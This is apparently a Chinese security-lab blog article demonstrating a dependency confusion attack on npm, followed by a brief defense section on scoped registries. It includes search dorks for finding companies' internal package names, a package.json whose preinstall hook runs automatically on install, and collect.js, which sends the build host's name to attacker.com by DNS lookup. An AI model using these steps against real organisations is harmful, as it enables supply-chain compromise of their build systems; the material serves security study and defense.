---
title: [前沿技术] 依赖混淆攻击实战
url: https://mp.weixin.qq.com/s/2bixNZYnhWJXf4HWG0I76Q
source: Doonsec's feed
date: 2026-05-25
fetch_date: 2026-05-26T06:06:15.545436
---

# [前沿技术] 依赖混淆攻击实战

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/BasqgWRklkTrib0KbiaMb51VicjnmiaV2I0L5g0ZnkddYIftiaDT9fhiaR1Kbia6UgQaGM9htibL01R2978VCZPX0l3rrwYRibsv7uBa0GPNickSYB0mI/0?wx_fmt=jpeg)

# [前沿技术] 依赖混淆攻击实战

原创

Pik安全实验室
Pik安全实验室

Pik安全实验室

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

0x00 介绍

依赖混淆（Dependency Confusion）由 Alex Birsan 在 2021 年提出。通过分析目标公司内部使用的私有包名，在公共仓库注册同名包并赋予极高版本号，包管理器会优先下载攻击者的恶意包。Apple、Microsoft、Tesla 等大量科技巨头均受影响。本文将详细演示攻击流程和检测方法。

0x01 攻击原理

包管理器（npm/pip/NuGet）解析依赖时，如果同时存在内部仓库和公共仓库，通常会选择版本号更高的包。攻击者注册的包版本设为 99.99.99，必然被选中。

0x02 实战步骤

Step 1: 信息收集

# 从 package.json 泄露的内部包名
# 扫描目标的公开仓库、JS 文件、错误信息

# 使用 npm-packlist 检查 node\_modules
ls -la node\_modules/@company-name/

# 搜索公开的 lock 文件
site:github.com "@target-company" filename:package-lock.json

# 从错误日志中提取
site:target.com "cannot find module" "@internal"

Step 2: 注册同名包

在 npm 注册与内部包同名的包，版本设为极高（如 999.0.0）。包内 preinstall 脚本在安装时自动执行。

// package.json
{
"name": "@company/internal-utils",
"version": "99.99.99",
"scripts": {
    "preinstall": "node ./collect.js"
}
}

// collect.js — DNS 外带验证
const dns = require('dns');
const os = require('os');
const hostname = os.hostname();
dns.lookup(`${hostname}.attacker.com`, console.log);

Step 3: 验证与利用

发布后等待目标的 CI/CD 自动构建触发安装。通过 DNS 日志确认代码执行。

0x03 防御

使用 scope 注册（@company/my-package）、npm 组织管理、配置 .npmrc 的 @scope:registry、使用 npm audit 检测、锁定依赖版本。

# .npmrc 配置 — 强制内部包走私有仓库
@company:registry=https://npm.company.com/

# package.json 中显式声明 registry
"publishConfig": {
  "registry": "https://npm.company.com/"
}

本文仅作安全研究与学习用途，用于非法行为后果自行承担。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/RBwZuZBV3fSt1n0yS8EEGgiaDF2WgPfMeiaGOMly1wWQQUlwiclwJDFJAZFGmeSroT0oLpGETAeKwiaPBeY1whYoOA/0?wx_fmt=png)

Pik安全实验室

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/RBwZuZBV3fSt1n0yS8EEGgiaDF2WgPfMeiaGOMly1wWQQUlwiclwJDFJAZFGmeSroT0oLpGETAeKwiaPBeY1whYoOA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过